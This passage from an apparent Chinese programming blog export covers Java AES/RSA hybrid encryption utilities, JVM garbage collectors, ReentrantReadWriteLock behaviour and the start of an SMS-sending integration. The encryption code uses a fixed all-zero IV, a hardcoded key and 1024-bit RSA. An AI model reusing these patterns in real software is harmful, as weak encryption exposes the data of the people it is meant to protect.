IvParameterSpec(new byte[cipher.getBlockSize()])); byte[] bs = cipher.doFinal(data.getBytes("UTF-8")); return Base64Util.encode(bs); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; /** * AES对称解密 key需要16位 * @param data * @param key * @return */ public static String decrypt(String data, String key) &#123; try &#123; SecretKeySpec spec = new SecretKeySpec(key.getBytes("UTF-8"), KEY_ALGORITHM); Cipher cipher = Cipher.getInstance(KEY_ALGORITHM_MODE); cipher.init(Cipher.DECRYPT_MODE , spec , new IvParameterSpec(new byte[cipher.getBlockSize()])); byte[] originBytes = Base64Util.decode(data); byte[] result = cipher.doFinal(originBytes); return new String(result,"UTF-8"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; public static void main(String[] args) throws Exception &#123; String key = "1234567890qwerty"; String dataToEn = "hello world....哈哈哈"; String enResult = encrypt(dataToEn,key); System.out.println(enResult);//BJL4buTESyjoCsOPaJ8LeevqTdQe4t4fBr9uxrhS8aA= String deResult = decrypt(enResult,key); System.out.println(deResult);//hello world....哈哈哈 &#125;&#125; 其中，Base64Util为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118public class Base64Util &#123; private static final char[] legalChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" .toCharArray(); public static String encode(byte[] data) &#123; byte start = 0; int len = data.length; StringBuffer buf = new StringBuffer(data.length * 3 / 2); int end = len - 3; int i = start; int n = 0; int d; while (i &lt;= end) &#123; d = (data[i] &amp; 255) &lt;&lt; 16 | (data[i + 1] &amp; 255) &lt;&lt; 8 | data[i + 2] &amp; 255; buf.append(legalChars[d &gt;&gt; 18 &amp; 63]); buf.append(legalChars[d &gt;&gt; 12 &amp; 63]); buf.append(legalChars[d &gt;&gt; 6 &amp; 63]); buf.append(legalChars[d &amp; 63]); i += 3; if (n++ &gt;= 14) &#123; n = 0; buf.append(" "); &#125; &#125; if (i == start + len - 2) &#123; d = (data[i] &amp; 255) &lt;&lt; 16 | (data[i + 1] &amp; 255) &lt;&lt; 8; buf.append(legalChars[d &gt;&gt; 18 &amp; 63]); buf.append(legalChars[d &gt;&gt; 12 &amp; 63]); buf.append(legalChars[d &gt;&gt; 6 &amp; 63]); buf.append("="); &#125; else if (i == start + len - 1) &#123; d = (data[i] &amp; 255) &lt;&lt; 16; buf.append(legalChars[d &gt;&gt; 18 &amp; 63]); buf.append(legalChars[d &gt;&gt; 12 &amp; 63]); buf.append("=="); &#125; return buf.toString(); &#125; private static int decode(char c) &#123; if (c &gt;= 65 &amp;&amp; c &lt;= 90) &#123; return c - 65; &#125; else if (c &gt;= 97 &amp;&amp; c &lt;= 122) &#123; return c - 97 + 26; &#125; else if (c &gt;= 48 &amp;&amp; c &lt;= 57) &#123; return c - 48 + 26 + 26; &#125; else &#123; switch (c) &#123; case '+': return 62; case '/': return 63; case '=': return 0; default: throw new RuntimeException("unexpected code: " + c); &#125; &#125; &#125; public static byte[] decode(String s) &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; decode(s, bos); &#125; catch (IOException var5) &#123; throw new RuntimeException(); &#125; byte[] decodedBytes = bos.toByteArray(); try &#123; bos.close(); bos = null; &#125; catch (IOException var4) &#123; System.err.println("Error while decoding BASE64: " + var4.toString()); &#125; return decodedBytes; &#125; private static void decode(String s, OutputStream os) throws IOException &#123; int i = 0; int len = s.length(); while (true) &#123; while (i &lt; len &amp;&amp; s.charAt(i) &lt;= 32) &#123; ++i; &#125; if (i == len) &#123; break; &#125; int tri = (decode(s.charAt(i)) &lt;&lt; 18) + (decode(s.charAt(i + 1)) &lt;&lt; 12) + (decode(s.charAt(i + 2)) &lt;&lt; 6) + decode(s.charAt(i + 3)); os.write(tri &gt;&gt; 16 &amp; 255); if (s.charAt(i + 2) == 61) &#123; break; &#125; os.write(tri &gt;&gt; 8 &amp; 255); if (s.charAt(i + 3) == 61) &#123; break; &#125; os.write(tri &amp; 255); i += 4; &#125; &#125;&#125; 4、RSA生成一对公钥和私钥 1234567KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(KEY_ALGORITHM);keyPairGen.initialize(1024);KeyPair keyPair = keyPairGen.generateKeyPair();PrivateKey privateKey = keyPair.getPrivate();PublicKey publicKey = keyPair.getPublic();System.out.println(Base64.encode(privateKey.getEncoded()));System.out.println(Base64.encode(publicKey.getEncoded())); 将私钥放进配置文件中等待读取，方便以后直接改动这个私钥。 RSA加密和解密工具类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788public class RSAUtil &#123; /** * 私钥字符串 */ private static String PRIVATE_KEY =""; /** * 公钥字符串 */ private static String PUBLIC_KEY ="MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHJkbiCWMzQyOOKeGopxP7Pl3ptFcuahVxAqK+o9FBGpcTr02ErKw42Oy3eYxLuIF1XSBVBFwdRWI9RueMo6rZtwJMmtT5cuMIAyDidEuvM0l1wurV6g0nbQK44J20DemG7iIJDpxJhjbBQknODDrafCRo9CVbynDvo6DnFkhXawIDAQAB"; public static final String KEY_ALGORITHM = "RSA"; /** * 从enc_pri文件读取密钥字符串 * @throws Exception */ public static void convert() throws Exception &#123; byte[] data = null; try &#123; InputStream is = RSAUtil.class.getResourceAsStream("/enc_pri"); int length = is.available(); data = new byte[length]; is.read(data); &#125; catch (Exception e) &#123; &#125; String dataStr = new String(data); try &#123; PRIVATE_KEY = dataStr; &#125; catch (Exception e) &#123; &#125; if (PRIVATE_KEY == null) &#123; throw new Exception("Fail to retrieve key"); &#125; &#125; /** * 私钥解密 * * @param data * @return * @throws Exception */ public static byte[] decryptByPrivateKey(byte[] data) throws Exception &#123; convert(); byte[] keyBytes = Base64Util.decode(PRIVATE_KEY); PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes); KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM); Key privateKey = keyFactory.generatePrivate(pkcs8KeySpec); Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm()); cipher.init(Cipher.DECRYPT_MODE, privateKey); return cipher.doFinal(data); &#125; /** * * @param data * @param key * @return * @throws Exception */ public static byte[] encryptByPublicKey(byte[] data, String key) throws Exception &#123; byte[] keyBytes = Base64Util.decode(key); X509EncodedKeySpec pkcs8KeySpec = new X509EncodedKeySpec(keyBytes); KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM); Key publicKey = keyFactory.generatePublic(pkcs8KeySpec); Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm()); cipher.init(Cipher.ENCRYPT_MODE, publicKey); return cipher.doFinal(data); &#125; public static void main(String[] args) throws Exception &#123; String data = "我在南邮玩耍呢！！！"; //用公钥加密 byte[] enResult = encryptByPublicKey(data.getBytes("UTF-8"),PUBLIC_KEY); System.out.println(enResult);//[B@2ff4f00f //用私钥解密 byte[] deResult = decryptByPrivateKey(enResult); System.out.println(new String(deResult,"UTF-8"));//我在南邮玩耍呢！！！ &#125;&#125; 将AES和RSA结合起来 1234567891011121314151617181920//key，16位或16的倍数即可，这里只是测试一下String key = "1234567890qwerty";//数据String dataToEn = "hello world....哈哈哈";//用对称加密算法对数据进行对称加密String enResult = encrypt(dataToEn,key);//用RSA对key用公钥进行非对称加密byte[] enkey = RSAUtil.encryptByPublicKey(key.getBytes("UTF-8"),"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHJkbiCWMzQyOOKeGopxP7Pl3ptFcuahVxAqK+o9FBGpcTr02ErKw42Oy3eYxLuIF1XSBVBFwdRWI9RueMo6rZtwJMmtT5cuMIAyDidEuvM0l1wurV6g0nbQK44J20DemG7iIJDpxJhjbBQknODDrafCRo9CVbynDvo6DnFkhXawIDAQAB");//再用base64对加密后的key编码一下，保证传输String baseKey = Base64Util.encode(enkey);//服务端根据公钥对应的私钥解密AES的keybyte[] de = Base64Util.decode(baseKey);byte[] deKeyResult = RSAUtil.decryptByPrivateKey(de);System.out.println("key="+new String(deKeyResult,"UTF-8"));//key=1234567890qwerty//根据解密后的key将用对称方式将数据再解密出来String deResult = decrypt(enResult,new String(deKeyResult,"UTF-8"));System.out.println("解密后的数据为："+deResult);//解密后的数据为：hello world....哈哈哈]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三、七种垃圾回收器]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%89%E3%80%81%E4%B8%83%E7%A7%8D%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%2F</url>
    <content type="text"><![CDATA[前人已经帮我们设计了很多的垃圾回收器，我们来了解了解吧！ 1、垃圾收集器组合 2、Serial收集器2.1 特点 Serial（串行）垃圾收集器是最基本、发展历史最悠久的收集器； JDK1.3.1前是HotSpot新生代收集的唯一选择； 针对新生代；采用复制算法； 单线程收集； 进行垃圾收集时，必须暂停所有工作线程，直到完成；即会”Stop The World”； 2.2 示意图 2.3 应用场景依然是HotSpot在Client模式下默认的新生代收集器；也有优于其他收集器的地方： 简单高效（与其他收集器的单线程相比）； 对于限定单个CPU的环境来说，Serial收集器没有线程交互（切换）开销，可以获得最高的单线程收集效率； 在用户的桌面应用场景中，可用内存一般不大（几十M至一两百M），可以在较短时间内完成垃圾收集（几十MS至一百多MS）,只要不频繁发生，这是可以接受的 3、ParNew收集器3.1 特点 ParNew垃圾收集器是Serial收集器的多线程版本。 除了多线程外，其余的行为、特点和Serial收集器一样； 两个收集器共用了不少代码； 3.2 示意图 3.3 应用场景 在Server模式下，ParNew收集器是一个非常重要的收集器，因为除Serial外，目前只有它能与CMS收集器配合工作； 但在单个CPU环境中，不会比Serail收集器有更好的效果，因为存在线程交互开销。 3.4 为什么只有ParNew能与CMS收集器配合CMS是HotSpot在JDK1.5推出的第一款真正意义上的并发（Concurrent）收集器，第一次实现了让垃圾收集线程与用户线程（基本上）同时工作； CMS作为老年代收集器，但却无法与JDK1.4已经存在的新生代收集器Parallel Scavenge配合工作； 因为Parallel Scavenge（以及G1）都没有使用传统的GC收集器代码框架，而另外独立实现；而其余几种收集器则共用了部分的框架代码； 4、Parallel Scavenge收集器Parallel Scavenge垃圾收集器因为与吞吐量关系密切，也称为吞吐量收集器（Throughput Collector）。 4.1 特点(A) 有一些特点与ParNew收集器相似 新生代收集器； 采用复制算法； 多线程收集； (B) 主要特点是：它的关注点与其他收集器不同 CMS等收集器的关注点是尽可能地缩短垃圾收集时用户线程的停顿时间； 而Parallel Scavenge收集器的目标则是达一个可控制的吞吐量（Throughput）； 4.2 应用场景 高吞吐量为目标，即减少垃圾收集时间，让用户代码获得更长的运行时间； 当应用程序运行在具有多个CPU上，对暂停时间没有特别高的要求时，即程序主要在后台进行计算，而不需要与用户进行太多交互； 例如，那些执行批量处理、订单处理、工资支付、科学计算的应用程序； 4.3 设置参数Parallel Scavenge收集器提供两个参数用于精确控制吞吐量： (A) “-XX:MaxGCPauseMillis” 控制最大垃圾收集停顿时间，大于0的毫秒数； MaxGCPauseMillis设置得稍小，停顿时间可能会缩短，但也可能会使得吞吐量下降； 因为可能导致垃圾收集发生得更频繁； (B) “-XX:GCTimeRatio” 设置垃圾收集时间占总时间的比率，0&lt;n&lt;100的整数； GCTimeRatio相当于设置吞吐量大小； 垃圾收集执行时间占应用程序执行时间的比例的计算方法是：1 / (1 + n) 例如，选项-XX:GCTimeRatio=19，设置了垃圾收集时间占总时间的5%–1/(1+19)； 默认值是1%–1/(1+99)，即n=99； 垃圾收集所花费的时间是年轻一代和老年代收集的总时间； 如果没有满足吞吐量目标，则增加代的内存大小以尽量增加用户程序运行的时间； 4.4 吞吐量与收集器关注点说明(A) 吞吐量（Throughput） CPU用于运行用户代码的时间与CPU总消耗时间的比值； 即吞吐量=运行用户代码时间/（运行用户代码时间+垃圾收集时间）； 高吞吐量即减少垃圾收集时间，让用户代码获得更长的运行时间； (B) 垃圾收集器期望的目标（关注点） (1) 停顿时间 停顿时间越短就适合需要与用户交互的程序； 良好的响应速度能提升用户体验； (2) 吞吐量 高吞吐量则可以高效率地利用CPU时间，尽快完成运算的任务； 主要适合在后台计算而不需要太多交互的任务； (3) 覆盖区（Footprint） 在达到前面两个目标的情况下，尽量减少堆的内存空间； 可以获得更好的空间局部性； 5、Serial Old收集器Serial Old是 Serial收集器的老年代版本； 5.1 特点 针对老年代； 采用”标记-整理”算法（还有压缩，Mark-Sweep-Compact）； 单线程收集； Serial/Serial Old收集器运行示意图如下： 5.2 应用场景 主要用于Client模式； 而在Server模式有两大用途： (A)在JDK1.5及之前，与Parallel Scavenge收集器搭配使用（JDK1.6有Parallel Old收集器可搭配）； (B)作为CMS收集器的后备预案，在并发收集发生Concurrent Mode Failure时使用（后面详解）； 6、Parallel Old收集器Parallel Old垃圾收集器是Parallel Scavenge收集器的老年代版本；JDK1.6中才开始提供； 6.1 特点 针对老年代； 采用”标记-整理”算法； 多线程收集； Parallel Scavenge/Parallel Old收集器运行示意图如下： 6.2 应用场景 JDK1.6及之后用来代替老年代的Serial Old收集器； 特别是在Server模式，多CPU的情况下； 这样在注重吞吐量以及CPU资源敏感的场景，就有了Parallel Scavenge加Parallel Old收集器的”给力”应用组合； 7、CMS收集器并发标记清理（Concurrent Mark Sweep，CMS）收集器也称为并发低停顿收集器（Concurrent Low Pause Collector）或低延迟（low-latency）垃圾收集器； 7.1 特点 针对老年代； 基于”标记-清除”算法(不进行压缩操作，产生内存碎片)； 以获取最短回收停顿时间为目标； 并发收集、低停顿； 需要更多的内存（看后面的缺点）； 是HotSpot在JDK1.5推出的第一款真正意义上的并发（Concurrent）收集器； 第一次实现了让垃圾收集线程与用户线程（基本上）同时工作； 7.2 应用场景 与用户交互较多的场景； 希望系统停顿时间最短，注重服务的响应速度； 以给用户带来较好的体验；如常见WEB、B/S系统的服务器上的应用； 7.3 CMS收集器运作过程(A)、初始标记（CMS initial mark） 仅标记一下GC Roots能直接关联到的对象； 速度很快； 但需要”Stop The World”； (B)、并发标记（CMS concurrent mark） 进行GC Roots Tracing的过程； 刚才产生的集合中标记出存活对象； 应用程序也在运行； 并不能保证可以标记出所有的存活对象； (C)、重新标记（CMS remark） 为了修正并发标记期间因用户程序继续运作而导致标记变动的那一部分对象的标记记录； 需要”Stop The World”，且停顿时间比初始标记稍长，但远比并发标记短； 采用多线程并行执行来提升效率； (D)、并发清除（CMS concurrent sweep） 回收所有的垃圾对象； 整个过程中耗时最长的并发标记和并发清除都可以与用户线程一起工作； 所以总体上说，CMS收集器的内存回收过程与用户线程一起并发执行； CMS收集器运行示意图如下： 7.4 CMS收集器3个明显的缺点对CPU资源非常敏感,占用大量cpu资源 在并发清除时，用户线程新产生的垃圾，称为浮动垃圾； 这使得并发清除时需要预留一定的内存空间，不能像其他收集器在老年代几乎填满再进行收集； 也要可以认为CMS所需要的空间比其他垃圾收集器大； “-XX:CMSInitiatingOccupancyFraction”：设置CMS预留内存空间； JDK1.5默认值为68%； JDK1.6变为大约92%； 无法处理浮动垃圾,可能出现”Concurrent Mode Failure”失败 如果CMS预留内存空间无法满足程序需要，就会出现一次”Concurrent Mode Failure”失败； 这时JVM启用后备预案：临时启用Serail Old收集器，而导致另一次Full GC的产生； 这样的代价是很大的，所以CMSInitiatingOccupancyFraction不能设置得太大。 产生大量内存碎片 由于CMS基于”标记-清除”算法，清除后不进行压缩操作； 7.5 CMS收集器总结总体来看，与Parallel Old垃圾收集器相比，CMS减少了执行老年代垃圾收集时应用暂停的时间； 但却增加了新生代垃圾收集时应用暂停的时间、降低了吞吐量而且需要占用更大的堆空间； 8、G1收集器G1（Garbage-First）是JDK7-u4才推出商用的收集器； 8.1 特点(A)、并行与并发 能充分利用多CPU、多核环境下的硬件优势； 可以并行来缩短”Stop The World”停顿时间； 也可以并发让垃圾收集与用户程序同时进行； (B)、分代收集，收集范围包括新生代和老年代 能独立管理整个GC堆（新生代和老年代），而不需要与其他收集器搭配； 能够采用不同方式处理不同时期的对象； 虽然保留分代概念，但Java堆的内存布局有很大差别； 将整个堆划分为多个大小相等的独立区域（Region）； 新生代和老年代不再是物理隔离，它们都是一部分Region（不需要连续）的集合； (C)、结合多种垃圾收集算法，空间整合，不产生碎片 从整体看，是基于标记-整理算法； 从局部（两个Region间）看，是基于复制算法； 这是一种类似火车算法的实现； 都不会产生内存碎片，有利于长时间运行； (D)、可预测的停顿：低停顿的同时实现高吞吐量 G1除了追求低停顿处，还能建立可预测的停顿时间模型； 可以明确指定M毫秒时间片内，垃圾收集消耗的时间不超过N毫秒； 8.2 应用场景面向服务端应用，针对具有大内存、多处理器的机器；最主要的应用是为需要低GC延迟，并具有大堆的应用程序提供解决方案；如：在堆大小约6GB或更大时，可预测的暂停时间可以低于0.5秒；用来替换掉JDK1.5中的CMS收集器； 在下面的情况时，使用G1可能比CMS好： （1）、超过50％的Java堆被活动数据占用； （2）、对象分配频率或年代提升频率变化很大； （3）、GC停顿时间过长（长于0.5至1秒）。 是否一定采用G1呢？也未必： （1）、如果现在采用的收集器没有出现问题，不用急着去选择G1； （2）、如果应用程序追求低停顿，可以尝试选择G1； （3）、是否代替CMS需要实际场景测试才知道。 8.3 为什么G1收集器可以实现可预测的停顿G1可以建立可预测的停顿时间模型，是因为： 可以有计划地避免在Java堆的进行全区域的垃圾收集； G1跟踪各个Region获得其收集价值大小，在后台维护一个优先列表； 每次根据允许的收集时间，优先回收价值最大的Region（名称Garbage-First的由来）； 这就保证了在有限的时间内可以获取尽可能高的收集效率； 8.4 一个对象被不同区域引用的问题 一个Region不可能是孤立的，一个Region中的对象可能被其他任意Region中对象引用，判断对象存活时，是否需要扫描整个Java堆才能保证准确？ 在其他的分代收集器，也存在这样的问题（而G1更突出）： a. 回收新生代也不得不同时扫描老年代？ b. 这样的话会降低Minor GC的效率； 解决方法： a. 无论G1还是其他分代收集器，JVM都是使用Remembered Set来避免全局扫描; b. 每个Region都有一个对应的Remembered Set； c. 每次Reference类型数据写操作时，都会产生一个Write Barrier暂时中断操作； d. 然后检查将要写入的引用指向的对象是否和该Reference类型数据在不同的Region（其他收集器：检查老年代对象是否引用了新生代对象）； e. 如果不同，通过CardTable把相关引用信息记录到引用指向对象的所在Region对应的Remembered Set中； f. 当进行垃圾收集时，在GC根节点的枚举范围加入Remembered Set； g. 就可以保证不进行全局扫描，也不会有遗漏。 8.5 G1收集器运作过程（A）、初始标记（Initial Marking） 仅标记一下GC Roots能直接关联到的对象； 且修改TAMS（Next Top at Mark Start）,让下一阶段并发运行时，用户程序能在正确可用的Region中创建新对象； 需要”Stop The World”，但速度很快； （B）、并发标记（Concurrent Marking） 进行GC Roots Tracing的过程； 刚才产生的集合中标记出存活对象； 耗时较长，但应用程序也在运行； 并不能保证可以标记出所有的存活对象； （C）、最终标记（Final Marking） 为了修正并发标记期间因用户程序继续运作而导致标记变动的那一部分对象的标记记录； 上一阶段对象的变化记录在线程的Remembered Set Log； 这里把Remembered Set Log合并到Remembered Set中； 需要”Stop The World”，且停顿时间比初始标记稍长，但远比并发标记短； 采用多线程并行执行来提升效率； （D）、筛选回收（Live Data Counting and Evacuation） 首先排序各个Region的回收价值和成本； 然后根据用户期望的GC停顿时间来制定回收计划； 最后按计划回收一些价值高的Region中垃圾对象； 回收时采用”复制”算法，从一个或多个Region复制存活对象到堆上的另一个空的Region，并且在此过程中压缩和释放内存； 可以并发进行，降低停顿时间，并增加吞吐量； G1收集器运行示意图如下:]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[七、读写锁]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%83%E3%80%81%E8%AF%BB%E5%86%99%E9%94%81%2F</url>
    <content type="text"><![CDATA[聊一聊ReentrantReadWriteLock。 1. 锁的分类 排他锁：在同一时刻只允许一个线程进行访问，其他线程等待； 读写锁：在同一时刻允许多个读线程访问，但是当写线程访问，所有的写线程和读线程均被阻塞。读写锁维护了一个读锁加一个写锁，通过读写锁分离的模式来保证线程安全，性能高于一般的排他锁。 2. 读写锁我们对数据的操作无非两种：“读”和“写”，试想一个这样的情景，当十个线程同时读取某个数据时，这个操作应不应该加同步。答案是没必要的。只有以下两种情况需要加同步： 这十个线程对这个公共数据既有读又有写 这十个线程对公共数据进行写操作 以上两点归结起来就一点就是有对数据进行改变的操作就需要同步 所以 java5提供了读写锁这种锁支持多线程读操作不互斥，多线程读写互斥，多线程写互斥。读操作不互斥这样有助于性能的提高，这点在java5以前没有。 3. java并发包提供的读写锁java并发包提供了读写锁的具体实现ReentrantReadWriteLock，它主要提供了一下特性： 公平性选择：支持公平和非公平（默认）两种获取锁的方式，非公平锁的吞吐量优于公平锁； 可重入：支持可重入，读线程在获取读锁之后能够再次获取读锁，写线程在获取了写锁之后能够再次获取写锁，同时也可以获取读锁； 锁降级：线程获取锁的顺序遵循获取写锁，获取读锁，释放写锁，写锁可以降级成为读锁。 4. 先看个小例子读取数据和写入数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import java.util.HashMap;import java.util.concurrent.locks.Lock;import java.util.concurrent.locks.ReadWriteLock;import java.util.concurrent.locks.ReentrantReadWriteLock;public class Demo &#123; //定义一个map用来读取和存放数据 private HashMap&lt;String,String&gt; map = new HashMap&lt;String,String&gt;(); //实例化ReentrantReadWriteLock private ReadWriteLock rwl = new ReentrantReadWriteLock(); //根据实例化对象分别获取读锁和写锁 private Lock r = rwl.readLock(); private Lock w = rwl.writeLock(); //读取数据 public void get(String key)&#123; //上读锁 r.lock(); System.out.println(Thread.currentThread().getName()+" 读操作开始执行"); try&#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; //读取数据 System.out.println(map.get(key)); &#125;finally &#123; //解读锁 r.unlock(); System.out.println(Thread.currentThread().getName()+" 读操作执行完毕"); &#125; &#125; //存入数据，即写数据 public void put(String key,String value)&#123; //上写锁 w.lock(); System.out.println(Thread.currentThread().getName()+" 写操作开始执行"); try&#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; //写数据 map.put(key, value); &#125;finally&#123; //解写锁 w.unlock(); System.out.println(Thread.currentThread().getName()+" 写操作执行完毕"); &#125; &#125; &#125; Main进行创建多线程测试：先来测试一下存在写的情况(只有写或者写读都有)1234567891011121314151617181920212223242526272829303132333435363738public class Main &#123; public static void main(String[] args) &#123; Demo demo = new Demo(); //写 new Thread(new Runnable() &#123; @Override public void run() &#123; demo.put("key1", "value1"); &#125; &#125;).start(); //读 new Thread(new Runnable() &#123; @Override public void run() &#123; demo.get("key1"); &#125; &#125;).start(); //写 new Thread(new Runnable() &#123; @Override public void run() &#123; demo.put("key2", "value2"); &#125; &#125;).start(); //写 new Thread(new Runnable() &#123; @Override public void run() &#123; demo.put("key3", "value3"); &#125; &#125;).start(); &#125;&#125; 执行结果：123456789Thread-0 写操作开始执行Thread-0 写操作执行完毕Thread-1 读操作开始执行value1Thread-1 读操作执行完毕Thread-2 写操作开始执行Thread-2 写操作执行完毕Thread-3 写操作开始执行Thread-3 写操作执行完毕 分析： 发现存在写的情况，那么就是一个同步等待的过程，即开始执行，然后等待3秒，执行完毕，符合第2个目录中提到的规则。 对只有读操作的情形进行测试 123456789101112131415161718192021222324252627282930public class Main &#123; public static void main(String[] args) &#123; Demo demo = new Demo(); demo.put("key1", "value1"); demo.put("key2", "value2"); demo.put("key3", "value3"); new Thread(new Runnable() &#123; @Override public void run() &#123; demo.get("key1"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; demo.get("key2"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; demo.get("key3"); &#125; &#125;).start(); &#125;&#125; 运行结果：12345678910111213141516main 写操作开始执行main 写操作执行完毕main 写操作开始执行main 写操作执行完毕main 写操作开始执行main 写操作执行完毕Thread-0 读操作开始执行Thread-1 读操作开始执行Thread-2 读操作开始执行value1Thread-0 读操作执行完毕value2Thread-1 读操作执行完毕value3Thread-2 读操作执行完毕 分析 在主线程中先put进去几个数用于读的测试，下面开辟三个读线程，我们可以从执行结果中发现，其中一个线程进去之后，另外的线程能够立即再次进入，即这三把锁不是互斥的。 总结： 在ReentrantReadWriteLock中实现了公平锁与非公平锁，主要区别就是：当一个线程尝试获取公平锁时，会检查这个结点是否是头结点的后继者，也就是不允许插队，插队就阻塞！ 与ReentrantLock中的公平锁、非公平锁类似，默认使用非公平锁。非公平锁有更高的吞吐率，更低的线程切换消耗！ 可重入 一个线程获取读锁后，这个线程可以再次获取这个读锁，但是这个线程不能获取对应写锁。 一个线程获取写锁后，这个线程可以再次获取这个写锁，同时它也可以获取对应的读锁。 注意：当前读锁被读取，以及当前线程不是获取写锁的线程时，则不能获取写锁。原因在于：读写锁要确保写锁的操作对读锁可见，如果允许读锁在已被获取的情况下获取写锁，那么正在运行的其他读线程就无法感知到写线程的操作。因此，只有等待其他读线程都释放了读锁，写锁才能被当前线程获取，一旦写锁被获取，其他读写线程的后续访问均被阻塞。 5. 锁降级锁降级是指写锁将为读锁。 锁降级：从写锁变成读锁；锁升级：从读锁变成写锁。读锁是可以被多线程共享的，写锁是单线程独占的。也就是说写锁的并发限制比读锁高，这可能就是升级/降级名称的来源。 如下代码会产生死锁，因为同一个线程中，在没有释放读锁的情况下，就去申请写锁，这属于锁升级，ReentrantReadWriteLock是不支持的。 12345ReadWriteLock rtLock = new ReentrantReadWriteLock(); rtLock.readLock().lock(); //上读锁System.out.println("get readLock."); rtLock.writeLock().lock(); //读锁还没有释放，不允许上死锁System.out.println("blocking"); ReentrantReadWriteLock支持锁降级，如下代码不会产生死锁。 123456ReadWriteLock rtLock = new ReentrantReadWriteLock(); rtLock.writeLock().lock(); //上写锁System.out.println("writeLock"); rtLock.readLock().lock(); //可以在写锁没有释放的时候立即上读锁System.out.println("get read lock"); 利用这个机制：同一个线程中，在没有释放读锁的情况下，就去申请写锁，这属于锁升级，ReentrantReadWriteLock是不支持的。 在写锁没有释放的时候，先获取到读锁，然后再释放写锁，保证后面读到的数据的一致性。 123456789101112131415private volatile boolean isUpdate;public void readWrite()&#123; r.lock();//为了保证isUpdate能够拿到最新的值 if(isUpdate)&#123; r.unlock(); w.lock(); map.put("xxx","xxx"); r.lock();//写锁还没有释放，立即获取读锁，阻塞本线程，保证本线程下面读的一致性 w.unlock(); &#125; String value = map.get("xxx"); //读到的数据是本线程自己更新的数据，不会被其他线程打扰 System.out.println(value); r.unlock();&#125;]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[七、整合发送短信]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%83%E3%80%81%E6%95%B4%E5%90%88%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[整合发送短信 1、引入http依赖1234567891011&lt;!--http--&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--activeMQ--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-activemq&lt;/artifactId&gt;&lt;/dependency&gt; 2、http工具类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364@Slf4jpublic class HttpUtil &#123; private static final String ENCODING = "UTF-8"; public static String post(String url, Map&lt;String, String&gt; paramsMap) &#123; CloseableHttpClient client = HttpClients.createDefault(); String responseText = ""; CloseableHttpResponse response = null; try &#123; HttpPost method = new HttpPost(url); if (paramsMap != null) &#123; List&lt;NameValuePair&gt; paramList = new ArrayList&lt;NameValuePair&gt;(); for (Map.Entry&lt;String, String&gt; param : paramsMap.entrySet()) &#123; NameValuePair pair = new BasicNameValuePair(param.getKey(), param.getValue()); paramList.add(pair); &#125; method.setEntity(new UrlEncodedFormEntity(paramList, ENCODING)); &#125; response = client.execute(method); HttpEntity entity = response.getEntity(); if (entity != null) &#123; responseText = EntityUtils.toString(entity); &#125; &#125; catch (Exception e) &#123; log.error("http request failed",e); &#125; finally &#123; try &#123; response.close(); &#125; catch (Exception e) &#123; log.error("",e); &#125; &#125; return responseText; &#125; public static String get(String url, Map&lt;String, String&gt; paramsMap) &#123; CloseableHttpClient client = HttpClients.createDefault(); String responseText = ""; CloseableHttpResponse response = null; try &#123; String getUrl = url+"?"; if (paramsMap != null) &#123; for (Map.Entry&lt;String, String&gt; param : paramsMap.entrySet()) &#123; getUrl += param.getKey() + "=" + URLEncoder.encode(param.getValue(), ENCODING)+"&amp;"; &#125; &#125; HttpGet method = new HttpGet(getUrl); response = client.execute(method); HttpEntity entity = response.getEntity(); if (entity != null) &#123; responseText = EntityUtils.toString(entity); &#125; &#125; catch (Exception e) &#123; log.error("http request failed",e); &#125; finally &#123; try &#123; response.close(); &#125; catch (Exception e) &#123; log.error("",e); &#125; &#125; return responseText; &#125;&#125; 3、controller先判断手机号码是否为空，然后发送短信验证码，注意这里传入了一个ip，拿到这个ip做安全校验12345678910111213141516171819@RequestMapping("/sendVercode")public ApiResult sendVercode(@RequestBody User user,HttpServletRequest request)&#123; ApiResult resp = new ApiResult(); try&#123; if(StringUtils.isBlank(user.getMobile()))&#123; throw new BikeException("手机号码不能为空"); &#125; userService.sendVercode(user.getMobile(),getIpFromRequest(request)); resp.setMessage("发送短信验证码成功"); &#125;catch (BikeException e)&#123; 